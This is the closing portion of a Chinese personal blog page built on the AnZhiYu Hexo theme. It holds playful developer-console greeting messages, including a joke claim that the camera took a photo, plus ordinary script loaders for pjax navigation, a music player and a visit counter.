      ██╔══██╗████╗  ██║╚══███╔╝██║  ██║██║╚██╗ ██╔╝██║   ██║
      ███████║██╔██╗ ██║  ███╔╝ ███████║██║ ╚████╔╝ ██║   ██║
      ██╔══██║██║╚██╗██║ ███╔╝  ██╔══██║██║  ╚██╔╝  ██║   ██║
      ██║  ██║██║ ╚████║███████╗██║  ██║██║   ██║   ╚██████╔╝
      ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝    ╚═════╝
        
        `,
    "已上线",
    dnum,
    "天",
    "©2023 By 安知鱼 V1.6.14",
  ];
  const ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为【小笨蛋】.`, `Photo captured: `, `🤪`];

  setTimeout(
    Log.bind(
      console,
      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
      "color:#425AEF",
      "",
      "color:#425AEF",
      "color:#425AEF",
      "",
      "color:#425AEF",
      ""
    )
  );
  setTimeout(
    Log.bind(
      console,
      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
      "color:white; background-color:#4fd953",
      "",
      "",
      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
    )
  );

  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小笨蛋.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(
      console,
      "%c ⚡ Powered by 安知鱼 %c 你正在访问 SmallHao 的博客.",
      "color:white; background-color:#f0ad4e",
      ""
    )
  );

  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
  );
});</script><script async src="/anzhiyu/random.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><input type="hidden" name="page-type" id="page-type" value="post"></div><script>var visitorMail = "";
</script><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><script id="click-heart" src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/dist/click-heart.min.js" async="async" mobile="false"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {
  // removeEventListener scroll 
  anzhiyu.removeGlobalFnEvent('pjax')
  anzhiyu.removeGlobalFnEvent('themeChange')

  document.getElementById('rightside').classList.remove('rightside-show')
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()
})

document.addEventListener('pjax:error', e => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script charset="UTF-8" src="https://cdn.cbd.int/anzhiyu-theme-static@1.1.5/accesskey/accesskey.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>